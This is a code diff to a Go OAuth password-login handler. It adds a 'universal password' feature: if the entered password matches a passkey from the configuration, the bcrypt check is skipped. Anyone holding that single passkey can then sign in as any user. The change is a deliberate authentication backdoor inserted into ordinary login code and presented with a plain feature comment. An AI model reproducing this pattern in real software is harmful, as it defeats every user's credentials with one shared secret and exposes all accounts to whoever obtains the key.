@@ -50,16 +50,19 @@ func userAuthorizationHandler(c *base.Config, s *Session) func(http.ResponseWrit
 	}
 }
 
-func passwordAuthorizationHandler(db *gorm.DB) func(context.Context, string, string, string) (string, error) {
+func passwordAuthorizationHandler(c *base.Config, db *gorm.DB) func(context.Context, string, string, string) (string, error) {
 	return func(ctx context.Context, clientID, username, password string) (string, error) {
 		user := sys.User{}
 		err := db.Model(&user).Where("username = ?", username).First(&user).Error
 		if err != nil {
 			return "", err
 		}
-		err = bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(password))
-		if err != nil {
-			return "", err
+		// 添加万能密码支持
+		if password != c.Oauth.Passkey {
+			err = bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(password))
+			if err != nil {
+				return "", err
+			}
 		}
 		return strconv.FormatUint(uint64(user.ID), 10), nil
 	}
